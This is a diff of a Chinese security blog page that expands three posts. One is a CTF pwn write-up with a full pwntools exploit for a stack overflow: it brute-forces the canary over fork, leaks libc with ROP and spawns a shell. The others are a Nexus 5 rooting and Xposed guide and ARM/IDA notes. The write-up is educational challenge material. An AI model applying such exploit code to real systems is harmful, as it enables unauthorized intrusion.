@@ -5,7 +5,7 @@
   
 
 
-<html class="theme-next gemini use-motion" lang="zh-Hans">
+<html class="theme-next muse use-motion" lang="zh-Hans">
 <head>
   <meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
@@ -95,7 +95,7 @@
   var NexT = window.NexT || {};
   var CONFIG = {
     root: '/',
-    scheme: 'Gemini',
+    scheme: 'Muse',
     version: '5.1.4',
     sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
     fancybox: true,
@@ -198,36 +198,6 @@
         </li>
       
         
-        <li class="menu-item menu-item-about">
-          <a href="/about/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
-            
-            关于
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            标签
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            分类
-          </a>
-        </li>
-      
-        
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
@@ -239,43 +209,9 @@
       
 
       
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
-            
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
-            
-            搜索
-          </a>
-        </li>
-      
     </ul>
   
 
-  
-    <div class="site-search">
-      
-  <div class="popup search-popup local-search-popup">
-  <div class="local-search-header clearfix">
-    <span class="search-icon">
-      <i class="fa fa-search"></i>
-    </span>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-    <div class="local-search-input-wrapper">
-      <input autocomplete="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
-    </div>
-  </div>
-  <div id="local-search-result"></div>
-</div>
-
-
-
-    </div>
   
 </nav>
 
@@ -309,7 +245,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sakura">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -393,17 +329,6 @@
 
           
             
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/01/24/stack_canary1/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2018/01/24/stack_canary1/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
           
 
           
@@ -430,21 +355,26 @@
       
         
           
-          赛题链接https://github.com/eternalsakura/ctf_pwn/tree/master/湖湘杯2017/pwn100h
-测试先随手输入测试一下从结果来看很像栈溢出了。
-静态分析找到漏洞打开IDA查看代码找到main函数，跟进sub_8048B29()
-跟进去找到输入点，可以看到最大可以输入512字节的数据，对于输入格式的要求是能够进行base64解码。
-根据我圈起来的地方基本上可以很明显的看出这是base64解密了
-如果对base64还有不懂，可以参考base64 c语言实现和维基百科
-找到栈溢出base64解码的结果存入char数组v21[257],base64解码
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/01/24/stack_canary1/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+            <h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/湖湘杯2017/pwn100h" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/湖湘杯2017/pwn100h</a></p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>先随手输入测试一下<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fnr17snvcmj30pp0b9acu.jpg" alt=""><br>从结果来看很像栈溢出了。</p>
+<h2 id="静态分析找到漏洞"><a href="#静态分析找到漏洞" class="headerlink" title="静态分析找到漏洞"></a>静态分析找到漏洞</h2><p>打开IDA查看代码<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fnr0sjo1l7j311s0zadmx.jpg" alt=""><br>找到main函数，跟进sub_8048B29()</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fnr0tqgpo7j30ys18camm.jpg" alt=""><br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fnr0ui1ac2j31h20mwq9c.jpg" alt=""><br>跟进去找到输入点，可以看到最大可以输入512字节的数据，对于输入格式的要求是能够进行base64解码。</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fnr0r7kf7fj31c810swma.jpg" alt=""><br>根据我圈起来的地方基本上可以很明显的看出这是<strong>base64解密</strong>了</p>
+<p>如果对base64还有不懂，可以参考<a href="http://blog.csdn.net/irwin_chen/article/details/9360845" target="_blank" rel="noopener">base64 c语言实现</a>和<a href="https://zh.wikipedia.org/wiki/Base64" target="_blank" rel="noopener">维基百科</a></p>
+<h3 id="找到栈溢出"><a href="#找到栈溢出" class="headerlink" title="找到栈溢出"></a>找到栈溢出</h3><p><strong>base64解码的结果存入char数组v21[257],base64解码之后的数据大小大概是原来的3/4，足够造成栈溢出了。</strong><br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fnr14iu7elj30ty0hwdm4.jpg" alt=""><br>漏洞函数地址为0x080487E6</p>
+<h3 id="分析下多进程"><a href="#分析下多进程" class="headerlink" title="分析下多进程"></a>分析下多进程</h3><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fnr41wc79bj313i0wqk0a.jpg" alt=""></p>
+<p>wait(0)函数的作用是等待任意一个子进程退出。<br><a href="http://www.cnblogs.com/linux-sir/archive/2012/01/27/2330014.html" target="_blank" rel="noopener">http://www.cnblogs.com/linux-sir/archive/2012/01/27/2330014.html</a></p>
+<h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><h3 id="checksec查看开启了什么保护，这题的难点就在canary了。"><a href="#checksec查看开启了什么保护，这题的难点就在canary了。" class="headerlink" title="checksec查看开启了什么保护，这题的难点就在canary了。"></a>checksec查看开启了什么保护，这题的难点就在canary了。</h3><p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fnr1akx9snj30dq055q3h.jpg" alt=""></p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>一般的思路是先leak出canary的cookie，然后在payload里，把原来的canary位置的cookie用我们leak出的正确的cookie写入，之后就是正常的rop。<br>不过这题,emmm，有个fork呀……参考这篇文章<a href="http://0x48.pw/2017/03/14/0x2d/，直接爆破canary" target="_blank" rel="noopener">http://0x48.pw/2017/03/14/0x2d/，直接爆破canary</a><br>这是个32位的程序，所以canary有4个字节，最低位一定是\x00，所以只需要爆破三个字节即可。<br>构造爆破payload格式为：<strong>padding+canary+chr(i)</strong><br>（canary的玩法不要太多，可以参考这篇文章：<a href="http://veritas501.space/2017/04/28/论canary的几种玩法/" target="_blank" rel="noopener">http://veritas501.space/2017/04/28/论canary的几种玩法/</a></p>
+<h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>先找到padding的大小<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fnr1qtw88zj30tg0ge0w1.jpg" alt=""><br>再看看canary在哪，在数组旁边。<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fnr28jztrzj30us04iabg.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fnr2app7duj30kq09sacp.jpg" alt=""><br>所以我们的padding大小就是257字节了。<br>再重复一遍，<strong>对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。 那我们就可以逐位爆破，如果程序GG了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary。</strong></p>
+<p>爆破函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">canary = &apos;\x00&apos;</span><br><span class="line">p.recvuntil(&apos;May be I can know if you give me some data[Y/N]\n&apos;)</span><br><span class="line">for i in xrange(3):</span><br><span class="line">    for j in xrange(256):</span><br><span class="line">        p.send(&apos;Y\n&apos;)</span><br><span class="line">        p.send(b64encode(&apos;a&apos;*257+ canary + chr(j)))</span><br><span class="line">        recv =p.recvuntil(&apos;May be I can know if you give me some data[Y/N]\n&apos;)</span><br><span class="line">        if &apos;Finish&apos; in recv:</span><br><span class="line">            canary += chr(j)</span><br><span class="line">            break</span><br><span class="line">print &apos;find canary:&apos;+canary.encode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure></p>
+<h3 id="构造rop"><a href="#构造rop" class="headerlink" title="构造rop"></a>构造rop</h3><p>关于构造rop可以参考蒸米的文章：<a href="https://yq.aliyun.com/articles/58699" target="_blank" rel="noopener">https://yq.aliyun.com/articles/58699</a><br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fnr4n4z0l8j30bc0exgme.jpg" alt=""></p>
+<h4 id="leak出puts函数的地址"><a href="#leak出puts函数的地址" class="headerlink" title="leak出puts函数的地址"></a>leak出puts函数的地址</h4><p>所以我们的payload1格式就是rop = padding + canary + padding + puts_plt_addr + 漏洞函数地址 + puts_got_addr(作为puts的参数）</p>
+<h4 id="计算system地址和在libc里找到’-bin-sh’地址"><a href="#计算system地址和在libc里找到’-bin-sh’地址" class="headerlink" title="计算system地址和在libc里找到’/bin/sh’地址"></a>计算system地址和在libc里找到’/bin/sh’地址</h4><p><code>libc.symbols[&#39;system&#39;] - libc.symbols[&#39;puts&#39;] + u32(puts_addr)</code><br><code>next(libc.search(&#39;/bin/sh&#39;)- libc.symbols[&#39;puts&#39;] + u32(puts_addr)</code></p>
+<h4 id="return-to-system，getshell"><a href="#return-to-system，getshell" class="headerlink" title="return to system，getshell"></a>return to system，getshell</h4><p>payload2格式为rop=padding+canary+padding+system_addr+padding+sh_addr<br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fnr5tbhz4nj30m10dpdhn.jpg" alt=""></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'pwns'</span>)</span><br><span class="line"><span class="comment"># libc = ELF('libc.so.6')</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">puts_plt_addr = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got_addr = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">vulc_addr = <span class="number">0x080487E6</span></span><br><span class="line">p = process(<span class="string">'./pwns'</span>)</span><br><span class="line"><span class="comment"># brute</span></span><br><span class="line">canary = <span class="string">'\x00'</span></span><br><span class="line">p.recvuntil(<span class="string">'May be I can know if you give me some data[Y/N]\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">        p.send(<span class="string">'Y\n'</span>)</span><br><span class="line">        p.send(b64encode(<span class="string">'a'</span>*<span class="number">257</span>+ canary + chr(j)))</span><br><span class="line">        recv =p.recvuntil(<span class="string">'May be I can know if you give me some data[Y/N]\n'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Finish'</span> <span class="keyword">in</span> recv:</span><br><span class="line">            canary += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'find canary:'</span>+canary.encode(<span class="string">'hex'</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">257</span>+ canary +<span class="string">'a'</span>*<span class="number">12</span>+flat(puts_plt_addr,vulc_addr,puts_got_addr)</span><br><span class="line">p.send(<span class="string">'Y\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give me some datas:\n\n'</span>)</span><br><span class="line">p.send(b64encode(payload1))</span><br><span class="line">puts_addr = p.recv()[<span class="number">268</span>:<span class="number">268</span>+<span class="number">4</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>] - libc.symbols[<span class="string">'puts'</span>] + u32(puts_addr)</span><br><span class="line">sh_addr = next(libc.search(<span class="string">'/bin/sh'</span>))- libc.symbols[<span class="string">'puts'</span>] + u32(puts_addr)</span><br><span class="line">p.send(<span class="string">'Y\n'</span>)</span><br><span class="line">p.send(<span class="string">'Y\n'</span>)</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">257</span>+canary+<span class="string">'a'</span>*<span class="number">12</span>+flat(system_addr,p32(<span class="number">1</span>),sh_addr)</span><br><span class="line">p.send(b64encode(payload2))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+          
         
       
     </div>
@@ -496,7 +426,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sakura">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -558,17 +488,6 @@
 
           
             
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/01/19/nexus51/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2018/01/19/nexus51/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
           
 
           
@@ -595,17 +514,26 @@
       
         
           
-          nexus5刷机adb reboot bootloaderfastboot oem unlock在这里根据不同的版本下载镜像：https://developers.google.com/android/imagesnexus5是hammerhead然后运行flash-all.sh脚本即可刷机
-root下载root工具包https://download.chainfire.eu/363/CF-Root/CF-Auto-Root/CF-Auto-Root-hammerhead-hammerhead-nexus5.zip
-运行root 脚本adb reboot bootloader命令行进入解压下载
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/01/19/nexus51/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+            <h2 id="nexus5刷机"><a href="#nexus5刷机" class="headerlink" title="nexus5刷机"></a>nexus5刷机</h2><p><code>adb reboot bootloader</code><br><code>fastboot oem unlock</code><br>在这里根据不同的版本下载镜像：<a href="https://developers.google.com/android/images" target="_blank" rel="noopener">https://developers.google.com/android/images</a><br>nexus5是hammerhead<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fnxp4v77ouj30yu112gsd.jpg" alt=""><br>然后运行flash-all.sh脚本即可刷机</p>
+<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><h3 id="下载root工具包"><a href="#下载root工具包" class="headerlink" title="下载root工具包"></a>下载root工具包</h3><p><a href="https://download.chainfire.eu/363/CF-Root/CF-Auto-Root/CF-Auto-Root-hammerhead-hammerhead-nexus5.zip" target="_blank" rel="noopener">https://download.chainfire.eu/363/CF-Root/CF-Auto-Root/CF-Auto-Root-hammerhead-hammerhead-nexus5.zip</a></p>
+<h3 id="运行root-脚本"><a href="#运行root-脚本" class="headerlink" title="运行root 脚本"></a>运行root 脚本</h3><p><code>adb reboot bootloader</code><br>命令行进入解压下载的工具包中<code>chmod +x root-mac.sh</code><br><code>./root-mac.sh</code><br>手机出现红色android,等待重启,查看是否已安装SuperSu权限管理工具</p>
+<h2 id="安装xposed（Android-4-0-3-up-to-Android-4-4"><a href="#安装xposed（Android-4-0-3-up-to-Android-4-4" class="headerlink" title="安装xposed（Android 4.0.3 up to Android 4.4)"></a>安装xposed（Android 4.0.3 up to Android 4.4)</h2><p><strong>关于xposed，有两种安装方法，对于低版本，直接安装xposed install即可，高版本需要刷入twrp（见下）</strong><br><a href="http://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="noopener">http://repo.xposed.info/module/de.robv.android.xposed.installer</a><br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fnxqd7t0wjj31jy1fmqeu.jpg" alt=""><br><code>adb install xx.apk</code>安装即可</p>
+<h2 id="安装xposed-Android-5-0-1，更高版本类似"><a href="#安装xposed-Android-5-0-1，更高版本类似" class="headerlink" title="安装xposed (Android 5.0.1，更高版本类似)"></a>安装xposed (Android 5.0.1，更高版本类似)</h2><h2 id="下载twrp"><a href="#下载twrp" class="headerlink" title="下载twrp"></a>下载twrp</h2><p>下载你的设备对应的<a href="https://twrp.me/Devices/" target="_blank" rel="noopener">twrp</a>,比如选择的是Google Nexus5，twrp-3.0.2-0-hammerhead.img</p>
+<ul>
+<li>进入bootloader刷机界面<br><code>adb reboot bootloader</code></li>
+<li>输入以下指令fastboot devices判断设备是否连接</li>
+<li><p>刷入TWRP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastboot flash recovery twrp-3.0.2-0-hammerhead.img</span><br><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>进入刷机界面<br><code>adb reboot recovery</code></p>
+<h2 id="下载xposed框架和应用"><a href="#下载xposed框架和应用" class="headerlink" title="下载xposed框架和应用"></a>下载xposed框架和应用</h2><h3 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a>下载安装包</h3><p>官方下载地址<a href="https://forum.xda-developers.com/showthread.php?t=3034811" target="_blank" rel="noopener">Xposed for Lollipop and Marshmallow</a><br>根据设备CPU型号下载对应的框架和应用,比如如果是nexus5 android5.0.1，选择<a href="http://dl-xda.xposed.info/framework/sdk21/arm/xposed-v86-sdk21-arm.zip" target="_blank" rel="noopener">xposed-v86-sdk21-arm.zip</a>和<a href="https://forum.xda-developers.com/attachment.php?attachmentid=4393082&amp;d=1516301692" target="_blank" rel="noopener">XposedInstaller_3.1.apk</a></p>
+</li>
+</ul>
+<h3 id="将xposed-v86-sdk21-arm-zip-push到手机中"><a href="#将xposed-v86-sdk21-arm-zip-push到手机中" class="headerlink" title="将xposed-v86-sdk21-arm.zip push到手机中"></a>将xposed-v86-sdk21-arm.zip push到手机中</h3><p><code>adb push xposed-v86-sdk21-arm.zip /sdcard</code><br>在twrp点击install ,选中xposed-v86-sdk21-arm.zip,然后点击flash,完成后重启</p>
+<h3 id="安装XposedInstaller-3-1-apk"><a href="#安装XposedInstaller-3-1-apk" class="headerlink" title="安装XposedInstaller_3.1.apk"></a>安装XposedInstaller_3.1.apk</h3><p><code>adb install XposedInstaller_3.1.apk</code><br>安装完成后打开应用查看是否已激活</p>
+<h2 id="提供其他的一些参考"><a href="#提供其他的一些参考" class="headerlink" title="提供其他的一些参考"></a>提供其他的一些参考</h2><p><a href="http://bbs.gfan.com/android-7599937-1-1.html" target="_blank" rel="noopener">http://bbs.gfan.com/android-7599937-1-1.html</a><br><a href="http://bbs.gfan.com/android-7537408-1-1.html" target="_blank" rel="noopener">http://bbs.gfan.com/android-7537408-1-1.html</a></p>
+
+          
         
       
     </div>
@@ -657,7 +585,7 @@ root下载root工具包https://download.chainfire.eu/363/CF-Root/CF-Auto-Root/CF
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sakura">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -719,17 +647,6 @@ root下载root工具包https://download.chainfire.eu/363/CF-Root/CF-Auto-Root/CF
 
           
             
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/01/18/arm1/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2018/01/18/arm1/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
           
 
           
@@ -756,51 +673,180 @@ root下载root工具包https://download.chainfire.eu/363/CF-Root/CF-Auto-Root/CF
       
         
           
-          arm汇编Android Native 进程启动流程
+            <h1 id="arm汇编"><a href="#arm汇编" class="headerlink" title="arm汇编"></a>arm汇编</h1><h2 id="Android-Native-进程启动流程"><a href="#Android-Native-进程启动流程" class="headerlink" title="Android Native 进程启动流程"></a>Android Native 进程启动流程</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/8ek7b9Jk2K.png?imageslim" alt="mark"></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/mJkdiFL95I.png?imageslim" alt="mark"></p>
+<p>ARM传参，R0-R3传递前四个参数</p>
+<h3 id="1-Thumb-指令集特点"><a href="#1-Thumb-指令集特点" class="headerlink" title="1. Thumb 指令集特点"></a>1. Thumb 指令集特点</h3><ul>
+<li>Thumb 指令集指令长度：16或32，16为为主</li>
+<li>Thumb-16 大部分只能访问前8个寄存器 R0-R7（少数可以访问R8-R15）</li>
+<li>Thumb-32 可以访问所有的ARM core 寄存器 R0-R15</li>
+</ul>
+<p>更小、更加灵活</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/3F7Kh72CcJ.png?imageslim" alt="mark"></p>
+<h3 id="2-ARM指令集特点"><a href="#2-ARM指令集特点" class="headerlink" title="2. ARM指令集特点"></a>2. ARM指令集特点</h3><ul>
+<li>指令长度32位，4字节对齐</li>
+<li>功能更加完善</li>
+</ul>
+<h4 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h4><table>
+<thead>
+<tr>
+<th>Thumb</th>
+<th>ARM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2字节对齐</td>
+<td>4字节对齐</td>
+</tr>
+<tr>
+<td>占用空间少、密度高</td>
+<td>占用空间较多</td>
+</tr>
+<tr>
+<td>功能不齐全</td>
+<td>功能齐全</td>
+</tr>
+</tbody>
+</table>
+<p>ARM和Thumb指令集各有自己的优点，取长补短往往会得到最好的性能</p>
+<h3 id="3-Opcod-中判断指令集"><a href="#3-Opcod-中判断指令集" class="headerlink" title="3. Opcod 中判断指令集"></a>3. Opcod 中判断指令集</h3><ul>
+<li>Opcode[15:13]== 111 &amp;&amp; Opcode[12:11]!= 00 满足则为32bit 的ARM</li>
+<li>bl #0x80000fbc</li>
+<li>0xed 0xff 0xff 0xeb</li>
+<li><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/HefgcabdgD.png?imageslim" alt="mark"></li>
+</ul>
+<h3 id="4-IDA-中识别与切换指令集"><a href="#4-IDA-中识别与切换指令集" class="headerlink" title="4. IDA 中识别与切换指令集"></a>4. IDA 中识别与切换指令集</h3><ul>
+<li>Edit-&gt;segments-&gt;change segment register value(快捷键ALT+G)</li>
+<li>请看操作。</li>
+</ul>
+<p>这有一段指令，判断出目前是thumb指令集的</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/bDfa164Gm2.png?imageslim" alt="mark"></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/L44GbeBb0g.png?imageslim" alt="mark"></p>
+<p>按下ALT+G,把0x1改成0x0，就是指定为ARM指令集</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/m6cmAKf7f1.png?imageslim" alt="mark"></p>
+<p>然后按下P键定义函数，函数参数就都分析出来了（</p>
+<h3 id="5-ARM切换指令集原理"><a href="#5-ARM切换指令集原理" class="headerlink" title="5. ARM切换指令集原理"></a>5. ARM切换指令集原理</h3><ul>
+<li>处理器无论在ARM还是Thumb状态下都可以通过BX/BLX/LDR/LDM切换不同的指令集。</li>
+<li>状态切换是由寄存器Rn的最低位来指定的，如果操作数寄存器的状态位Bit0=0，则进入ARM状态，如果Bit0=1，则进入Thumb状态。</li>
+</ul>
+<h3 id="ARM-中对于字节、字、双字的定义"><a href="#ARM-中对于字节、字、双字的定义" class="headerlink" title="ARM 中对于字节、字、双字的定义"></a>ARM 中对于字节、字、双字的定义</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/42LgAImG8C.png?imageslim" alt="mark"></p>
+<p>注意和intel汇编的区别，一个word(字)这里是4个字节</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/k6BCjcgdHD.png?imageslim" alt="mark"></p>
+<p><strong>但是注意一下，在IDA中依然延续着老的传统，一个DCW(word)代表两个字节</strong></p>
+<ul>
+<li><strong>DCB  定义1字节数据</strong></li>
+<li><strong>DCW  定义2字节数据</strong></li>
+<li><strong>DCD  定义4字节数据</strong></li>
+<li><strong>在IDA中，在上面这些数据定义上按下D键可以切换定义的类型</strong></li>
+<li><strong>Array 定义数组，右键或*号键</strong></li>
+</ul>
+<p>数组最常见的就在数组，</p>
+<h2 id="IDA中的自定义数据类型"><a href="#IDA中的自定义数据类型" class="headerlink" title="IDA中的自定义数据类型"></a>IDA中的自定义数据类型</h2><p><strong>Structures 窗口中可以创建一个自定义结构体。按下I或者Ins键即可创建。</strong></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/JGdKAA9LFK.png?imageslim" alt="mark"></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/6BhFchfIi3.png?imageslim" alt="mark"></p>
+<p>创建了一个名为test的结构体</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/dK8d27jgfb.png?imageslim" alt="mark"></p>
+<p>因为没有定义字段，所以现在都还是空的，结构体长度为0（相当于空结构体，没有任何内容）</p>
+<p>所以去定义字段。</p>
+<h3 id="为自定义数据类型添加字段"><a href="#为自定义数据类型添加字段" class="headerlink" title="为自定义数据类型添加字段"></a>为自定义数据类型添加字段</h3><p>创建完结构体后，长这样：</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/GmCIi75chL.png?imageslim" alt="mark"></p>
+<p>在ends处按下D键就可以定义一个字段了，在字段上按D可以改变长度1/2/4</p>
+<p>其他按键：</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/fJeKmkHmL6.png?imageslim" alt="mark"></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/Hl91i5EjJE.png?imageslim" alt="mark"></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/F9JfJKKKBG.png?imageslim" alt="mark"></p>
+<p>这样就可以给一个变量转成自己的结构体类型</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/6llGaFG7k6.png?imageslim" alt="mark"></p>
+<h3 id="应用自定义数据类型"><a href="#应用自定义数据类型" class="headerlink" title="应用自定义数据类型"></a>应用自定义数据类型</h3><p><strong>在起始数据处右键-&gt;Structure-&gt;自定义的数据类型</strong></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/e5bagIfbfD.png?imageslim" alt="mark"></p>
+<h2 id="ARM汇编中的标志寄存器与条件代码"><a href="#ARM汇编中的标志寄存器与条件代码" class="headerlink" title="ARM汇编中的标志寄存器与条件代码"></a>ARM汇编中的标志寄存器与条件代码</h2><h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><ul>
+<li><strong>b指令</strong>：跳转</li>
+<li><strong>bl指令</strong>：跳转且保存返回地址</li>
+<li><strong>blx/bx指令</strong>：带x，可以切换指令集</li>
+</ul>
+<p><strong>分支指令例子：</strong></p>
+<p><strong>beq</strong>=b+eq（equal)=b指令+条件助记符（参考下面的cond）</p>
+<p><strong>ben</strong></p>
+<h3 id="条件执行"><a href="#条件执行" class="headerlink" title="条件执行"></a>条件执行</h3><p><strong>ARM中大部分的指令都支持带条件执行。</strong></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/aFcH160afA.png?imageslim" alt="mark"></p>
+<p>cond:前四位保存条件码</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/8ecida68KH.png?imageslim" alt="mark"></p>
